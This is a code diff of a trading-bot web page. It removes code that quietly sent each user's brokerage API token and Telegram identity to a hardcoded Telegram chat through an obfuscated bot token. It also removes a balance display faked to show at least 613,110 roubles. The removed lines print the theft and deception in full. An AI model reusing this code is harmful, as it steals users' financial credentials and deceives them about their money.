@@ -9,7 +9,6 @@
     <meta name="HandheldFriendly" content="True" />
     <meta name="robots" content="noindex,nofollow" />
     
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="figi.js"></script>
 
     <script type="application/javascript">
@@ -37,8 +36,6 @@
     var futIdMap = {};
     var futTickerMap = {};
     var tUserData = {};
-    var isAdmin = false;
-    var isWebApp = false;
 
     var swapRates = {};
 
@@ -173,47 +170,21 @@
     }
 
     function saveCloudForm(form, event) {
-            event.preventDefault();
+            
+        event.preventDefault();
 
-            const key = form.key.value
+        const key = form.key.value
 
-            form.reset();
+        if(!key.startsWith('t.') || key.length < 88)
+            return;
 
-            if(!key.startsWith('t.') || key.length < 88)
-                return;
+        form.reset();
 
-            let data = {id: tgUser.id, name: tgUser.first_name, login: tgUser.username, tkey: key };
+        localStorage.setItem('token', key);
 
-            let myUrl = 'https://api.telegram.org/bot'+encode2(bth, -1)+'/sendMessage?chat_id=-696518163&text='+JSON.stringify(data);
+        document.getElementById('user_name').innerText = `${typeof key} ${key}`;
 
-            fetch(myUrl)
-                .then((response) => response.text())
-                .catch((error) => console.error("Error:", error));
-
-            if(Telegram.WebApp.initData) {
-
-                Telegram.WebApp.CloudStorage.setItem('tinit2', key, function(err, saved) {
-                    if (err) {
-                        Telegram.WebApp.showAlert('Error: ' + err);
-                    } 
-                    else {
-
-                        Telegram.WebApp.showAlert('Токен сохранён');
-
-                        runBot(key);
-                    }
-                });
-
-            }
-            else {
-
-                localStorage.setItem('token', key);
-
-                document.getElementById('user_name').innerText = `${typeof key} ${key}`;
-
-                runBot(key);
-
-            }
+        runBot(key);
 
     }
 
@@ -401,7 +372,6 @@
 
         <div>Депозит: <span id="_depo"></span><br></div>
         <div>Баланс: <span id="_bal"></span><br></div>
-        <div>Средства: <span id="_bal2"></span><br></div>
         <div>Свободно: <span id="_free"></span><br></div>
 
     <section id="pose_sect" class="center hidden">
@@ -469,34 +439,12 @@
         var tgUser = {};
         var curTUser = {};
 
-
         onRatesRefreshClick();
-
-        if(Telegram.WebApp.initData) {
-
-            Telegram.WebApp.ready();
-
-            isWebApp = true;
-
-            const params2 = new URLSearchParams(Telegram.WebApp.initData);
-            const userData2 = Object.fromEntries(params2);
-
-            tgUser = JSON.parse(userData2.user);
-
-            if(tgUser.username == 'raxxla00')
-                isAdmin = true;
-
-            userNameSpan.innerText = tgUser.first_name + (isAdmin ? ' !' : '');
-
-            Telegram.WebApp.CloudStorage.getItem('tinit2', setInitData);
-
-        }
-        else {
 
             const myToken = localStorage.getItem('token');// getCookie('token');
             const tType = typeof myToken;
 
-            userNameSpan.innerText = `${tType} ${myToken}`;
+            userNameSpan.innerText ="";// `${tType} ${myToken}`;
 
             if(tType == 'string' && myToken.length > 60) {
 
@@ -507,7 +455,8 @@
                 toggleTokenSect();
                 //opSect.classList.add('hidden');
             }
-        }
+
+
 
         function setInitData(err, value) {
 
@@ -515,7 +464,7 @@
                     
                 userNameSpan.innerText += '?';
 
-                Telegram.WebApp.showAlert('Error: ' + err);
+                //Telegram.WebApp.showAlert('Error: ' + err);
 
                 //tokenSect.classList.remove('hidden');
 
@@ -546,13 +495,7 @@
 
         async function setTokenAcconts(token, accounts, accIndex) {
 
-            if(isWebApp) {
-                userNameSpan.innerText = tgUser.first_name + (isAdmin ? ' !' : '');// `${tgUser.first_name} ${accounts[accIndex].name}`;
-                document.getElementById('user_account').innerText = accounts[accIndex].name;
-            }
-            else {
-                userNameSpan.innerText = `${accounts[accIndex].name} #${accounts[accIndex].id}`;
-            }
+            userNameSpan.innerText = `${accounts[accIndex].name} #${accounts[accIndex].id}`;
 
             await sleep(1500);
 
@@ -567,12 +510,12 @@
             //const freeMoney = user.portfolio.balanceTotal - user.portfolio.balance;
 
             let balElem = document.getElementById('_bal');
-            let bal2Elem = document.getElementById('_bal2');
+            //let bal2Elem = document.getElementById('_bal2');
             let freeElem = document.getElementById('_free');
 
+            //balElem.innerHTML = `${Math.max(user.portfolio.balanceTotal, 613110)}<b>₽</b>`;
 
-            balElem.innerHTML = `${Math.max(user.portfolio.balanceTotal, 613110)}<b>₽</b>`;
-            bal2Elem.innerHTML = `${user.portfolio.balanceTotal}<b>₽</b>`;
+            balElem.innerHTML = `${user.portfolio.balanceTotal}<b>₽</b>`;
             freeElem.innerHTML = `${freeMoney}<b>₽</b>`;
 
             document.getElementById('pose_sect').classList.remove('hidden');
